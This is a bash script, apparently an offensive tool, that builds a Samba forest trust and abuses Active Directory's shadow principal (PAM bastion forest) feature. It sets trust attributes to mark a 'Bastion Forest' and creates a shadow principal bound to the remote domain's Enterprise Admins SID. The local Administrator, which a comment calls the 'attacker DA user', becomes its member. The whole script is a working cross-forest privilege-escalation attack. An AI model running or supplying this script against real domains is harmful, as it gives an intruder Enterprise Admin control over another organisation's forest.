#!/bin/bash

localdom=$1
localsuffix=$2
remdom=$3
remsuffix=$4
shadowprinsid=$5
remote=$6
localccachepath=$7
remccachepath=$8

# Use Python to convert supplied SID to binary form necessary for raw LDAP operations
cat > /tmp/convSid.py << EOF
import struct
import base64
import sys

def sid_to_bytes(sid_string):
    parts = sid_string.strip('S-').split('-')
    revision = int(parts[0])
    sub_authority_count = len(parts) - 2

    # Identifier Authority (big-endian 6-byte value, typically 0,0,0,0,0,5 for NT Authority)
    # The value '5' needs special handling to be represented as 00 00 00 00 00 05 (big-endian)
    identifier_authority = int(parts[1])

    # Start with revision (1 byte) and sub-authority count (1 byte)
    byte_sid = struct.pack('<BB', revision, sub_authority_count)

    # Pack the 6-byte Identifier Authority. This is tricky to do with standard struct
    # for a 6-byte int. A common value for domain SIDs is '5' (NT AUTHORITY) which is
    # 0x000000000005. We can hardcode the common case (S-1-5) or handle generally.
    if identifier_authority == 5:
        byte_sid += struct.pack('>Q', identifier_authority)[2:] # Take last 6 bytes of big-endian uint64
    else:
        # Generic handling is more complex due to 6-byte size
        print('Error: Non-standard SID authority not fully supported by this script.')
        sys.exit(1)

    # Pack the sub-authorities (little-endian 32-bit integers)
    for i in range(2, len(parts)):
        sub_authority = int(parts[i])
        # Use '<L' for little-endian unsigned long (4 bytes)
        byte_sid += struct.pack('<L', sub_authority)

    return byte_sid

if __name__ == '__main__':
    binary_data = sid_to_bytes(sys.argv[1])
    print(base64.b64encode(binary_data).decode('utf-8'))
EOF

b64sid=$(python3 /tmp/convSid.py $shadowprinsid)

# Create trust
sudo samba-tool domain trust create $remdom.$remsuffix --type=forest --direction=incoming --treat-as-external -U $remdom.$remsuffix\\Administrator --use-krb5-ccache=$remccachepath --local-dc-username=$localdom.$localsuffix\\Administrator --local-dc-use-krb5-ccache=$localccachepath

# Modify trust attributes on remote
cat > remtrustattr.ldif << EOF
dn: CN=$localdom.$localsuffix,CN=System,DC=$remdom,DC=$remsuffix
action: modify
replace: trustAttributes
trustAttributes: 1096 # Bastion Forest
EOF

KRB5CCNAME=$remccachepath ldapmodify -Q -Y GSSAPI -H ldap://$remote -f remtrustattr.ldif

# Modify trust attributes locally
cat > localtrustattr.ldif << EOF
dn: CN=$remdom.$remsuffix,CN=System,DC=$localdom,DC=$localsuffix
action: modify
replace: trustAttributes
trustAttributes: 1096 # Bastion Forest
EOF

KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f localtrustattr.ldif

# Create shadow principal container
cat > shadowcontaineradd.ldif << EOF
dn: CN=Shadow Principal Configuration,CN=Configuration,DC=$localdom,DC=$localsuffix
objectClass: top
objectClass: msDS-ShadowPrincipalContainer
description: Container for Shadow Principal objects
EOF

KRB5CCNAME=$localccachepath ldapadd -Q -Y GSSAPI -H ldap://127.0.0.1 -f shadowcontaineradd.ldif

# Create "Enterprise Admins" shadow principal and add attacker DA user to it
cat > shadowprin.ldif << EOF
dn: CN=$remdom-Enterprise Admins,CN=Shadow Principal Configuration,CN=Configuration,DC=$localdom,DC=$localsuffix
changetype: add
objectClass: msDS-ShadowPrincipal
msDS-ShadowPrincipalSid: $b64sid
member: CN=Administrator,CN=Users,DC=$localdom,DC=$localsuffix
EOF

KRB5CCNAME=$localccachepath ldapmodify -Q -Y GSSAPI -H ldap://127.0.0.1 -f shadowprin.ldif
